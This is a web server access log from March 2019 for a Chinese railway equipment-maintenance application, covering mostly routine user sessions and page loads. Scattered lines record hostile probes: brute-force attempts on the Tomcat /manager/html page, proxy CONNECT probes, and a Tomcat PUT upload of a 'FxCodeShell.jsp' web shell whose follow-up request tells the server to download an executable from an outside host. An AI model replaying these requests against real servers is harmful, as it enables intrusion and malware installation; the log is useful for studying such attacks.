103.78.12.70 - - [19/Mar/2019:00:22:44 +0800] "GET / HTTP/1.1" 200 11418
36.47.161.128 - - [19/Mar/2019:02:58:55 +0800] "GET /gdjk/train/css/icons/cancel.png HTTP/1.1" 200 1133
36.47.161.128 - - [19/Mar/2019:02:58:55 +0800] "GET /gdjk/train/images/dialog_bg.jpg HTTP/1.1" 200 28355
36.47.161.128 - - [19/Mar/2019:02:58:55 +0800] "GET /gdjk/train/jcsbgl-dialog.do?_=1552906525644 HTTP/1.1" 200 12285
36.47.161.128 - - [19/Mar/2019:02:59:03 +0800] "GET /gdjk/train/anno.do?title=%E8%AE%BE%E5%A4%87%E7%BB%B4%E6%8A%A4%E7%AE%A1%E7%90%86&_=1552906525645 HTTP/1.1" 200 14757
36.47.161.128 - - [19/Mar/2019:02:59:03 +0800] "GET /gdjk/train/anno.do?title=%E8%AE%BE%E5%A4%87%E7%BB%B4%E6%8A%A4%E7%AE%A1%E7%90%86&_=1552906525646 HTTP/1.1" 200 14757
36.47.161.128 - - [19/Mar/2019:02:59:03 +0800] "GET /gdjk/train/bdjzcs.do?_=1552906525647 HTTP/1.1" 200 10025
36.47.161.128 - - [19/Mar/2019:02:59:03 +0800] "POST /gdjk/equ/jccsList.do HTTP/1.1" 200 15270
36.47.161.128 - - [19/Mar/2019:02:59:03 +0800] "POST /gdjk/equ/jccsList.do HTTP/1.1" 200 15270
36.47.161.128 - - [19/Mar/2019:02:59:04 +0800] "GET /gdjk/train/anno.do?title=%E8%AE%BE%E5%A4%87%E7%BB%B4%E6%8A%A4%E7%AE%A1%E7%90%86&_=1552906525648 HTTP/1.1" 200 14757
36.47.161.128 - - [19/Mar/2019:02:59:04 +0800] "GET /gdjk/train/anno.do?title=%E8%AE%BE%E5%A4%87%E7%BB%B4%E6%8A%A4%E7%AE%A1%E7%90%86&_=1552906525649 HTTP/1.1" 200 14757
36.47.161.128 - - [19/Mar/2019:02:59:04 +0800] "GET /gdjk/train/sbbdjl.do?zxjl=0&_=1552906525650 HTTP/1.1" 200 8476
36.47.161.128 - - [19/Mar/2019:02:59:04 +0800] "POST /gdjk/equ/outBdList.do HTTP/1.1" 200 84274
36.47.161.128 - - [19/Mar/2019:02:59:04 +0800] "POST /gdjk/equ/outBdList.do HTTP/1.1" 200 84274
36.47.161.128 - - [19/Mar/2019:02:59:15 +0800] "GET /gdjk/train/anno.do?title=%E8%AE%BE%E5%A4%87%E7%BB%B4%E6%8A%A4%E7%AE%A1%E7%90%86&_=1552906525651 HTTP/1.1" 200 14757
36.47.161.128 - - [19/Mar/2019:02:59:15 +0800] "GET /gdjk/train/anno.do?title=%E8%AE%BE%E5%A4%87%E7%BB%B4%E6%8A%A4%E7%AE%A1%E7%90%86&_=1552906525652 HTTP/1.1" 200 14757
36.47.161.128 - - [19/Mar/2019:02:59:15 +0800] "GET /gdjk/train/jcsbgl.do?_=1552906525653 HTTP/1.1" 200 9988
36.47.161.128 - - [19/Mar/2019:02:59:15 +0800] "POST /gdjk/train/jcsbglList.do HTTP/1.1" 200 8946
36.47.161.128 - - [19/Mar/2019:02:59:15 +0800] "POST /gdjk/train/jcsbglList.do HTTP/1.1" 200 8946
36.47.161.128 - - [19/Mar/2019:02:59:18 +0800] "GET /gdjk/train/jcsbgl-dialog.do?_=1552906525654 HTTP/1.1" 200 12285
36.47.161.128 - - [19/Mar/2019:02:59:30 +0800] "GET /gdjk/train/anno.do?title=%E9%85%8D%E4%BB%B6%E5%BA%93%E5%AD%98%E7%AE%A1%E7%90%86&_=1552906525655 HTTP/1.1" 200 1424
36.47.161.128 - - [19/Mar/2019:02:59:31 +0800] "GET /gdjk/train/anno.do?title=%E9%85%8D%E4%BB%B6%E5%BA%93%E5%AD%98%E7%AE%A1%E7%90%86&_=1552906525656 HTTP/1.1" 200 1424
36.47.161.128 - - [19/Mar/2019:02:59:31 +0800] "GET /gdjk/train/anno.do?title=%E9%85%8D%E4%BB%B6%E5%BA%93%E5%AD%98%E7%AE%A1%E7%90%86&_=1552906525657 HTTP/1.1" 200 1424
36.47.161.128 - - [19/Mar/2019:02:59:31 +0800] "GET /gdjk/train/pjxx.do?_=1552906525658 HTTP/1.1" 200 7885
36.47.161.128 - - [19/Mar/2019:02:59:31 +0800] "POST /gdjk/lj/queryLjList.do HTTP/1.1" 200 789
36.47.161.128 - - [19/Mar/2019:02:59:31 +0800] "POST /gdjk/lj/queryLjList.do HTTP/1.1" 200 789
36.47.161.128 - - [19/Mar/2019:02:59:36 +0800] "GET /gdjk/train/anno.do?title=%E7%BA%BF%E8%B7%AF%E7%AE%A1%E7%90%86&_=1552906525659 HTTP/1.1" 200 1418
36.47.161.128 - - [19/Mar/2019:02:59:36 +0800] "GET /gdjk/train/anno.do?title=%E7%BA%BF%E8%B7%AF%E7%AE%A1%E7%90%86&_=1552906525660 HTTP/1.1" 200 1418
36.47.161.128 - - [19/Mar/2019:02:59:36 +0800] "GET /gdjk/train/anno.do?title=%E7%BA%BF%E8%B7%AF%E7%AE%A1%E7%90%86&_=1552906525661 HTTP/1.1" 200 1418
36.47.161.128 - - [19/Mar/2019:02:59:36 +0800] "GET /gdjk/train/line.do?rwb_railwaybigtype=1&_=1552906525662 HTTP/1.1" 200 9908
36.47.161.128 - - [19/Mar/2019:02:59:36 +0800] "POST /gdjk/line/queryLine.do HTTP/1.1" 200 3636
36.47.161.128 - - [19/Mar/2019:02:59:36 +0800] "POST /gdjk/line/queryLine.do HTTP/1.1" 200 3636
36.47.161.128 - - [19/Mar/2019:02:59:38 +0800] "GET /gdjk/train/anno.do?title=%E7%BA%BF%E8%B7%AF%E7%AE%A1%E7%90%86&_=1552906525663 HTTP/1.1" 200 1418
36.47.161.128 - - [19/Mar/2019:02:59:38 +0800] "GET /gdjk/train/anno.do?title=%E7%BA%BF%E8%B7%AF%E7%AE%A1%E7%90%86&_=1552906525664 HTTP/1.1" 200 1418
36.47.161.128 - - [19/Mar/2019:02:59:38 +0800] "GET /gdjk/train/line.do?rwb_railwaybigtype=2&_=1552906525665 HTTP/1.1" 200 8136
36.47.161.128 - - [19/Mar/2019:02:59:38 +0800] "POST /gdjk/line/queryStation.do HTTP/1.1" 200 398
36.47.161.128 - - [19/Mar/2019:02:59:38 +0800] "POST /gdjk/line/queryStation.do HTTP/1.1" 200 398
36.47.161.128 - - [19/Mar/2019:02:59:39 +0800] "GET /gdjk/train/anno.do?title=%E7%BA%BF%E8%B7%AF%E7%AE%A1%E7%90%86&_=1552906525666 HTTP/1.1" 200 1418
36.47.161.128 - - [19/Mar/2019:02:59:39 +0800] "GET /gdjk/train/anno.do?title=%E7%BA%BF%E8%B7%AF%E7%AE%A1%E7%90%86&_=1552906525667 HTTP/1.1" 200 1418
36.47.161.128 - - [19/Mar/2019:02:59:39 +0800] "GET /gdjk/train/line.do?rwb_railwaybigtype=3&_=1552906525668 HTTP/1.1" 200 9905
36.47.161.128 - - [19/Mar/2019:02:59:39 +0800] "POST /gdjk/line/queryLine.do HTTP/1.1" 200 3636
36.47.161.128 - - [19/Mar/2019:02:59:39 +0800] "POST /gdjk/line/queryLine.do HTTP/1.1" 200 3636
36.47.161.128 - - [19/Mar/2019:02:59:41 +0800] "GET /gdjk/train/anno.do?title=%E7%BA%BF%E8%B7%AF%E7%AE%A1%E7%90%86&_=1552906525669 HTTP/1.1" 200 1418
36.47.161.128 - - [19/Mar/2019:02:59:41 +0800] "GET /gdjk/train/anno.do?title=%E7%BA%BF%E8%B7%AF%E7%AE%A1%E7%90%86&_=1552906525670 HTTP/1.1" 200 1418
36.47.161.128 - - [19/Mar/2019:02:59:41 +0800] "GET /gdjk/train/linedept.do?_=1552906525671 HTTP/1.1" 200 9986
36.47.161.128 - - [19/Mar/2019:02:59:41 +0800] "POST /gdjk/line/queryLineDept.do HTTP/1.1" 200 563
36.47.161.128 - - [19/Mar/2019:02:59:41 +0800] "POST /gdjk/line/queryLineName.do HTTP/1.1" 500 12742
36.47.161.128 - - [19/Mar/2019:02:59:41 +0800] "POST /gdjk/sys/getDepTree.do HTTP/1.1" 200 15138
36.47.161.128 - - [19/Mar/2019:02:59:41 +0800] "POST /gdjk/line/queryLineName.do HTTP/1.1" 500 12742
36.47.161.128 - - [19/Mar/2019:02:59:41 +0800] "POST /gdjk/sys/getDepTree.do HTTP/1.1" 200 15138
36.47.161.128 - - [19/Mar/2019:02:59:41 +0800] "POST /gdjk/line/queryLineDept.do HTTP/1.1" 200 563
36.47.161.128 - - [19/Mar/2019:02:59:41 +0800] "GET /gdjk/train/css/ext_icons/tielu.jpg HTTP/1.1" 200 1419
36.47.161.128 - - [19/Mar/2019:02:59:43 +0800] "POST /gdjk/line/queryLineDept.do HTTP/1.1" 200 563
36.47.161.128 - - [19/Mar/2019:02:59:44 +0800] "POST /gdjk/line/queryLineDept.do HTTP/1.1" 200 563
36.47.161.128 - - [19/Mar/2019:02:59:45 +0800] "POST /gdjk/line/queryLineDept.do HTTP/1.1" 200 563
36.47.161.128 - - [19/Mar/2019:02:59:46 +0800] "POST /gdjk/line/queryLineDept.do HTTP/1.1" 200 563
36.47.161.128 - - [19/Mar/2019:02:59:46 +0800] "POST /gdjk/line/queryLineDept.do HTTP/1.1" 200 563
36.47.161.128 - - [19/Mar/2019:02:59:47 +0800] "POST /gdjk/line/queryLineDept.do HTTP/1.1" 200 563
36.47.161.128 - - [19/Mar/2019:02:59:47 +0800] "POST /gdjk/line/queryLineDept.do HTTP/1.1" 200 563
36.47.161.128 - - [19/Mar/2019:02:59:48 +0800] "POST /gdjk/line/queryLineDept.do HTTP/1.1" 200 563
36.47.161.128 - - [19/Mar/2019:02:59:58 +0800] "GET /gdjk/train/anno.do?title=%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%AE%A1%E7%90%86&_=1552906525672 HTTP/1.1" 200 1424
36.47.161.128 - - [19/Mar/2019:02:59:59 +0800] "GET /gdjk/train/anno.do?title=%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%AE%A1%E7%90%86&_=1552906525673 HTTP/1.1" 200 1424
36.47.161.128 - - [19/Mar/2019:02:59:59 +0800] "GET /gdjk/train/anno.do?title=%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%AE%A1%E7%90%86&_=1552906525674 HTTP/1.1" 200 1424
36.47.161.128 - - [19/Mar/2019:02:59:59 +0800] "GET /gdjk/train/xlqxsj.do?_=1552906525675 HTTP/1.1" 200 9363
36.47.161.128 - - [19/Mar/2019:02:59:59 +0800] "POST /gdjk/equ/outBdList.do HTTP/1.1" 200 84274
36.47.161.128 - - [19/Mar/2019:02:59:59 +0800] "POST /gdjk/equ/outBdList.do HTTP/1.1" 200 84274
36.47.161.128 - - [19/Mar/2019:03:00:04 +0800] "GET /gdjk/train/anno.do?title=%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%AE%A1%E7%90%86&_=1552906525676 HTTP/1.1" 200 1424
36.47.161.128 - - [19/Mar/2019:03:00:04 +0800] "GET /gdjk/train/anno.do?title=%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%AE%A1%E7%90%86&_=1552906525677 HTTP/1.1" 200 1424
36.47.161.128 - - [19/Mar/2019:03:00:05 +0800] "GET /gdjk/train/xlfdsj.do?_=1552906525678 HTTP/1.1" 200 8287
36.47.161.128 - - [19/Mar/2019:03:00:05 +0800] "POST /gdjk/equ/outBdList.do HTTP/1.1" 200 84274
36.47.161.128 - - [19/Mar/2019:03:00:05 +0800] "POST /gdjk/equ/outBdList.do HTTP/1.1" 200 84274
36.47.161.128 - - [19/Mar/2019:03:00:06 +0800] "GET /gdjk/train/anno.do?title=%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%AE%A1%E7%90%86&_=1552906525679 HTTP/1.1" 200 1424
36.47.161.128 - - [19/Mar/2019:03:00:06 +0800] "GET /gdjk/train/anno.do?title=%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%AE%A1%E7%90%86&_=1552906525680 HTTP/1.1" 200 1424
36.47.161.128 - - [19/Mar/2019:03:00:06 +0800] "GET /gdjk/train/xldlsj.do?_=1552906525681 HTTP/1.1" 200 8165
36.47.161.128 - - [19/Mar/2019:03:00:06 +0800] "POST /gdjk/equ/outBdList.do HTTP/1.1" 200 84274
36.47.161.128 - - [19/Mar/2019:03:00:06 +0800] "POST /gdjk/equ/outBdList.do HTTP/1.1" 200 84274
36.47.161.128 - - [19/Mar/2019:03:00:07 +0800] "GET /gdjk/train/anno.do?title=%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%AE%A1%E7%90%86&_=1552906525682 HTTP/1.1" 200 1424
36.47.161.128 - - [19/Mar/2019:03:00:07 +0800] "GET /gdjk/train/anno.do?title=%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%AE%A1%E7%90%86&_=1552906525683 HTTP/1.1" 200 1424
36.47.161.128 - - [19/Mar/2019:03:00:07 +0800] "GET /gdjk/train/xlpdsj.do?_=1552906525684 HTTP/1.1" 200 8726
36.47.161.128 - - [19/Mar/2019:03:00:07 +0800] "POST /gdjk/equ/outBdList.do HTTP/1.1" 200 84274
36.47.161.128 - - [19/Mar/2019:03:00:07 +0800] "POST /gdjk/equ/outBdList.do HTTP/1.1" 200 84274
36.47.161.128 - - [19/Mar/2019:03:00:08 +0800] "GET /gdjk/train/anno.do?title=%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%AE%A1%E7%90%86&_=1552906525685 HTTP/1.1" 200 1424
36.47.161.128 - - [19/Mar/2019:03:00:08 +0800] "GET /gdjk/train/anno.do?title=%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%AE%A1%E7%90%86&_=1552906525686 HTTP/1.1" 200 1424
36.47.161.128 - - [19/Mar/2019:03:00:08 +0800] "GET /gdjk/train/xlcgtsj.do?_=1552906525687 HTTP/1.1" 404 1005
62.182.201.208 - - [19/Mar/2019:03:29:16 +0800] "GET / HTTP/1.1" 200 11418
80.82.70.187 - - [19/Mar/2019:03:47:34 +0800] "GET /cache/global/img/gs.gif HTTP/1.1" 404 997
37.6.246.64 - - [19/Mar/2019:04:38:17 +0800] "GET / HTTP/1.1" 200 11418
78.108.177.50 - - [19/Mar/2019:05:05:17 +0800] "GET / HTTP/1.0" 200 11398
223.166.32.71 - - [19/Mar/2019:05:55:19 +0800] "GET /gdjk/login.do HTTP/1.1" 200 3997
223.166.32.71 - - [19/Mar/2019:05:55:19 +0800] "GET /gdjk/train/css/login.css HTTP/1.1" 200 4452
223.166.32.71 - - [19/Mar/2019:05:55:19 +0800] "GET /gdjk/authCode.do HTTP/1.1" 200 1643
223.166.32.71 - - [19/Mar/2019:05:55:19 +0800] "GET /gdjk/train/js/login.js HTTP/1.1" 200 1669
223.166.32.71 - - [19/Mar/2019:05:55:19 +0800] "GET /gdjk/train/js/jquery.particleground.js HTTP/1.1" 200 14075
223.166.32.71 - - [19/Mar/2019:05:55:19 +0800] "GET /gdjk/train/js/jquery-1.8.0.min.js HTTP/1.1" 200 92556
223.166.32.71 - - [19/Mar/2019:05:55:19 +0800] "GET /gdjk/train/images/yzmz-icon.jpg HTTP/1.1" 200 15000
223.166.32.71 - - [19/Mar/2019:05:55:19 +0800] "GET /gdjk/train/images/mima-icon.jpg HTTP/1.1" 200 1413
223.166.32.71 - - [19/Mar/2019:05:55:19 +0800] "GET /gdjk/train/images/user-icon.jpg HTTP/1.1" 200 1405
220.158.151.29 - - [19/Mar/2019:06:38:12 +0800] "GET / HTTP/1.1" 200 11418
49.49.242.211 - - [19/Mar/2019:08:31:34 +0800] "GET /manager/html HTTP/1.1" 401 2536
49.49.242.211 - admin [19/Mar/2019:08:31:35 +0800] "GET /manager/html HTTP/1.1" 403 3274
49.49.242.211 - - [19/Mar/2019:08:31:35 +0800] "GET /manager/html HTTP/1.1" 401 2536
49.49.242.211 - - [19/Mar/2019:08:31:36 +0800] "GET /manager/html HTTP/1.1" 401 2536
49.49.242.211 - - [19/Mar/2019:08:31:36 +0800] "GET /manager/html HTTP/1.1" 401 2536
49.49.242.211 - - [19/Mar/2019:08:31:37 +0800] "GET /manager/html HTTP/1.1" 401 2536
49.49.242.211 - - [19/Mar/2019:08:31:39 +0800] "GET /manager/html HTTP/1.1" 401 2536
49.49.242.211 - - [19/Mar/2019:08:31:39 +0800] "GET /manager/html HTTP/1.1" 401 2536
49.49.242.211 - - [19/Mar/2019:08:31:40 +0800] "GET /manager/html HTTP/1.1" 401 2536
186.225.188.80 - - [19/Mar/2019:09:03:30 +0800] "GET / HTTP/1.0" 200 11398
46.174.191.28 - - [19/Mar/2019:10:22:46 +0800] "GET / HTTP/1.0" 200 11398
46.174.191.28 - - [19/Mar/2019:10:45:18 +0800] "GET / HTTP/1.0" 200 11398
103.245.18.130 - - [19/Mar/2019:10:59:24 +0800] "GET /manager/html HTTP/1.1" 401 2536
103.245.18.130 - - [19/Mar/2019:10:59:24 +0800] "GET /manager/html HTTP/1.1" 401 2536
106.45.8.46 - - [19/Mar/2019:10:59:24 +0800] "CONNECT www.baidu.com HTTP/1.1" 400 -
58.19.1.250 - - [19/Mar/2019:10:59:24 +0800] "GET / HTTP/1.1" 200 11418
103.245.18.130 - admin [19/Mar/2019:10:59:24 +0800] "GET /manager/html HTTP/1.1" 403 3274
171.12.10.187 - - [19/Mar/2019:10:59:25 +0800] "GET / HTTP/1.1" 200 11418
1.28.88.225 - - [19/Mar/2019:10:59:25 +0800] "GET / HTTP/1.1" 200 11418
58.248.202.174 - - [19/Mar/2019:10:59:26 +0800] "CONNECT www.baidu.com:443 HTTP/1.1" 400 -
182.138.137.135 - - [19/Mar/2019:10:59:27 +0800] "GET / HTTP/1.1" 200 11418
222.94.163.15 - - [19/Mar/2019:10:59:27 +0800] "GET / HTTP/1.1" 200 11418
110.177.84.210 - - [19/Mar/2019:10:59:29 +0800] "GET / HTTP/1.1" 200 11418
14.204.127.162 - - [19/Mar/2019:10:59:30 +0800] "GET / HTTP/1.1" 200 11418
223.166.74.233 - - [19/Mar/2019:10:59:33 +0800] "GET /english/ HTTP/1.1" 404 967
112.66.97.252 - - [19/Mar/2019:10:59:33 +0800] "CONNECT www.voanews.com:443 HTTP/1.1" 400 -
60.13.7.71 - - [19/Mar/2019:10:59:35 +0800] "CONNECT cn.bing.com:443 HTTP/1.1" 400 -
78.108.177.54 - - [19/Mar/2019:11:14:44 +0800] "GET / HTTP/1.0" 200 11398
190.244.104.103 - - [19/Mar/2019:11:26:49 +0800] "GET / HTTP/1.1" 200 11418
80.82.70.187 - - [19/Mar/2019:14:06:19 +0800] "GET /cache/global/img/gs.gif HTTP/1.1" 404 997
71.6.232.4 - - [19/Mar/2019:14:18:32 +0800] "GET / HTTP/1.1" 200 11418
185.213.169.70 - - [19/Mar/2019:14:37:00 +0800] "GET / HTTP/1.1" 200 11418
103.196.233.57 - - [19/Mar/2019:14:57:56 +0800] "GET / HTTP/1.1" 200 11418
78.108.177.50 - - [19/Mar/2019:14:59:22 +0800] "GET / HTTP/1.0" 200 11398
94.124.17.30 - - [19/Mar/2019:15:33:03 +0800] "GET / HTTP/1.1" 200 11418
46.174.191.32 - - [19/Mar/2019:15:46:50 +0800] "GET / HTTP/1.0" 200 11398
112.175.232.250 - - [19/Mar/2019:16:21:07 +0800] "GET / HTTP/1.1" 200 11418
74.82.47.3 - - [19/Mar/2019:16:25:10 +0800] "GET / HTTP/1.1" 200 11418
218.45.238.172 - - [19/Mar/2019:16:31:50 +0800] "GET /manager/html HTTP/1.1" 401 2536
218.45.238.172 - admin [19/Mar/2019:16:31:50 +0800] "GET /manager/html HTTP/1.1" 403 3274
218.45.238.172 - - [19/Mar/2019:16:31:50 +0800] "GET /manager/html HTTP/1.1" 401 2536
218.45.238.172 - - [19/Mar/2019:16:31:51 +0800] "GET /manager/html HTTP/1.1" 401 2536
218.45.238.172 - - [19/Mar/2019:16:31:51 +0800] "GET /manager/html HTTP/1.1" 401 2536
218.45.238.172 - - [19/Mar/2019:16:31:51 +0800] "GET /manager/html HTTP/1.1" 401 2536
218.45.238.172 - - [19/Mar/2019:16:31:51 +0800] "GET /manager/html HTTP/1.1" 401 2536
218.45.238.172 - - [19/Mar/2019:16:31:51 +0800] "GET /manager/html HTTP/1.1" 401 2536
218.45.238.172 - - [19/Mar/2019:16:31:51 +0800] "GET /manager/html HTTP/1.1" 401 2536
141.98.80.23 - - [19/Mar/2019:17:12:18 +0800] "-" 400 -
78.108.177.52 - - [19/Mar/2019:17:22:14 +0800] "GET / HTTP/1.0" 200 11398
176.124.127.91 - - [19/Mar/2019:18:13:53 +0800] "GET / HTTP/1.1" 200 11418
200.153.154.141 - - [19/Mar/2019:18:30:26 +0800] "GET / HTTP/1.1" 200 11418
113.200.161.14 - - [19/Mar/2019:19:50:34 +0800] "PUT /FxCodeShell.jsp%20 HTTP/1.1" 403 961
113.200.161.14 - - [19/Mar/2019:19:50:34 +0800] "PUT /FxCodeShell.jsp::$DATA HTTP/1.1" 403 961
113.200.161.14 - - [19/Mar/2019:19:50:34 +0800] "PUT /FxCodeShell.jsp/ HTTP/1.1" 403 961
113.200.161.14 - - [19/Mar/2019:19:50:34 +0800] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe HTTP/1.1" 404 981
179.56.149.191 - - [19/Mar/2019:19:52:35 +0800] "GET / HTTP/1.1" 200 11418
223.25.98.58 - - [19/Mar/2019:20:03:13 +0800] "GET / HTTP/1.1" 200 11418
114.240.230.211 - - [19/Mar/2019:20:50:41 +0800] "GET /azenv.php HTTP/1.1" 404 969
78.108.177.54 - - [19/Mar/2019:21:04:40 +0800] "GET / HTTP/1.0" 200 11398
118.116.19.127 - - [19/Mar/2019:21:09:42 +0800] "GET /gdjk/login.do HTTP/1.1" 200 3997
118.116.19.127 - - [19/Mar/2019:21:09:42 +0800] "GET /gdjk/train/css/login.css HTTP/1.1" 200 4452
118.116.19.127 - - [19/Mar/2019:21:09:42 +0800] "GET /gdjk/authCode.do HTTP/1.1" 200 1562
118.116.19.127 - - [19/Mar/2019:21:09:42 +0800] "GET /gdjk/train/js/jquery.particleground.js HTTP/1.1" 200 14075
118.116.19.127 - - [19/Mar/2019:21:09:42 +0800] "GET /gdjk/train/js/login.js HTTP/1.1" 200 1669
118.116.19.127 - - [19/Mar/2019:21:09:43 +0800] "GET /gdjk/train/images/yzmz-icon.jpg HTTP/1.1" 200 15000
118.116.19.127 - - [19/Mar/2019:21:09:43 +0800] "GET /gdjk/train/images/mima-icon.jpg HTTP/1.1" 200 1413
118.116.19.127 - - [19/Mar/2019:21:09:43 +0800] "GET /gdjk/train/js/jquery-1.8.0.min.js HTTP/1.1" 200 92556
118.116.19.127 - - [19/Mar/2019:21:09:43 +0800] "GET /gdjk/train/images/user-icon.jpg HTTP/1.1" 200 1405
118.116.19.127 - - [19/Mar/2019:21:09:43 +0800] "GET /gdjk/train/images/fav.ico HTTP/1.1" 200 4286
118.116.19.127 - - [19/Mar/2019:21:09:59 +0800] "POST /gdjk/login.do HTTP/1.1" 200 9062
118.116.19.127 - - [19/Mar/2019:21:09:59 +0800] "GET /gdjk/train/css/main.css HTTP/1.1" 200 4300
118.116.19.127 - - [19/Mar/2019:21:09:59 +0800] "GET /gdjk/train/css/icon.css HTTP/1.1" 200 4947
118.116.19.127 - - [19/Mar/2019:21:09:59 +0800] "GET /gdjk/train/easyui/datagrid-groupview.js HTTP/1.1" 200 13084
118.116.19.127 - - [19/Mar/2019:21:09:59 +0800] "GET /gdjk/train/easyui/easyui-lang-zh_CN.js HTTP/1.1" 200 2501
118.116.19.127 - - [19/Mar/2019:21:10:00 +0800] "GET /gdjk/train/easyui/jquery.min.js HTTP/1.1" 200 95957
118.116.19.127 - - [19/Mar/2019:21:10:00 +0800] "GET /gdjk/train/easyui/easyui.css HTTP/1.1" 200 69986
118.116.19.127 - - [19/Mar/2019:21:10:00 +0800] "GET /gdjk/train/easyui/jquery.easyui.min.js HTTP/1.1" 200 436133
118.116.19.127 - - [19/Mar/2019:21:10:00 +0800] "GET /gdjk/train/images/top_bg1.jpg HTTP/1.1" 200 1320
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/train/images/user.png HTTP/1.1" 200 130034
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/train/easyui/images/panel_tools.png HTTP/1.1" 200 852
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/train/easyui/images/blank.gif HTTP/1.1" 200 43
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/train/easyui/images/layout_arrows.png HTTP/1.1" 200 319
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/train/easyui/images/tabs_icons.png HTTP/1.1" 200 150
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/train/easyui/images/loading.gif HTTP/1.1" 200 1737
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/train/anno.do?_=1552972110220 HTTP/1.1" 200 15529
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/sys/getMenuTree2.do? HTTP/1.1" 200 8632
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/train/css/icons/reload.png HTTP/1.1" 200 1045
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/train/easyui/images/accordion_arrows.png HTTP/1.1" 200 184
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/train/css/ext_icons/yiqi.png HTTP/1.1" 200 521
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/train/css/ext_icons/shebei.png HTTP/1.1" 200 932
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/train/css/ext_icons/shouji.png HTTP/1.1" 200 759
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/train/css/ext_icons/diannao.png HTTP/1.1" 200 719
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/train/easyui/images/tree_icons.png HTTP/1.1" 200 3115
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/train/css/ext_icons/zulin.png HTTP/1.1" 200 496
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/train/css/ext_icons/biaoding.png HTTP/1.1" 200 617
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/train/css/ext_icons/weixiu.png HTTP/1.1" 200 686
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/train/css/ext_icons/zhuangtai.png HTTP/1.1" 200 265
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/train/css/ext_icons/xiaoshou.png HTTP/1.1" 200 528
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/train/css/ext_icons/canshu.png HTTP/1.1" 200 535
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/train/css/ext_icons/zuoye.png HTTP/1.1" 200 412
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/train/anno.do?title=%E8%AE%BE%E5%A4%87%E7%BB%B4%E6%8A%A4%E7%AE%A1%E7%90%86&_=1552972110221 HTTP/1.1" 200 15547
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/train/css/ext_icons/caidan.png HTTP/1.1" 200 236
118.116.19.127 - - [19/Mar/2019:21:10:01 +0800] "GET /gdjk/train/css/ext_icons/yonghu.png HTTP/1.1" 200 347
